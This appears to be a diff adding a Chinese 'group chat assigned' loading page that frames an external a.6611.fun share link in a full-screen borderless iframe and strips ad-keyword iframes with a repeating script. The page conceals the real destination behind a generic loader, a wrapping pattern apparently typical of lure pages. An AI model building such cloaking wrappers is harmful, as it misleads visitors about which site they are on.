@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>群聊分配成功..</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+html,body{width:100%;height:100%;overflow:hidden;background:#f5f7fa}
+#loading{
+  position:fixed;top:0;left:0;width:100%;height:100%;
+  display:flex;align-items:center;justify-content:center;
+  flex-direction:column;z-index:999;background:#f5f7fa;
+  transition: opacity 0.4s ease;
+}
+.loader{
+  width:50px;height:50px;
+  border:4px solid #eaecef;
+  border-top-color:#5b7cfe;
+  border-radius:50%;
+  animation:rotate 0.8s linear infinite;
+  margin-bottom:20px;
+}
+@keyframes rotate{to{transform:rotate(360deg)}}
+.text{
+  font-size:18px;color:#333;
+  animation:fade 1.6s infinite;
+}
+@keyframes fade{0%,100%{opacity:.6}50%{opacity:1}}
+iframe{
+  position:fixed;top:0;left:0;width:100%;height:100%;
+  border:none;opacity:0;transition:opacity 0.4s ease;z-index:1
+}
+/* 广告拦截样式 */
+iframe[src*="ad"],iframe[src*="ads"],iframe[src*="advert"],
+iframe[src*="popup"],iframe[src*="click"],iframe[src*="googlesyndicate"]
+{display:none!important;height:0!important;visibility:hidden!important}
+</style>
+</head>
+<body>
+<div id="loading">
+  <div class="loader"></div>
+  <div class="text">正在加入群聊，请稍候...</div>
+</div>
+<iframe id="myFrame" src="" allowfullscreen webkitallowfullscreen mozallowfullscreen></iframe>
+
+<script>
+const loading = document.getElementById('loading');
+const iframe = document.getElementById('myFrame');
+let done = false;
+
+// 目标链接
+iframe.src = "https://a.6611.fun/group.php/index/share/id/142/t/de09a0b6e28a7e80fcc01bdb14e5c7c7/time/1780897696.html";
+
+// 显示页面
+function show(){
+  if(done) return; done=true;
+  loading.style.opacity=0;
+  setTimeout(()=>{
+    loading.style.display='none';
+    iframe.style.opacity=1;
+  },300);
+}
+
+// 广告拦截：自动清理页面里的广告iframe
+function blockAds() {
+  try {
+    let iframes = document.getElementsByTagName('iframe');
+    for (let i = iframes.length - 1; i >= 0; i--) {
+      let src = iframes[i].src || '';
+      if (
+        src.match(/ad|ads|advert|popup|click|googlesyndicate|doubleclick/i)
+      ) {
+        iframes[i].remove();
+      }
+    }
+  } catch(e){}
+}
+
+// 加载完成后执行拦截
+iframe.onload = function(){
+  show();
+  blockAds();
+  setInterval(blockAds, 800); // 持续拦动态广告
+};
+iframe.onerror = show;
+setTimeout(show, 500);
+</script>
+</body>
+</html>
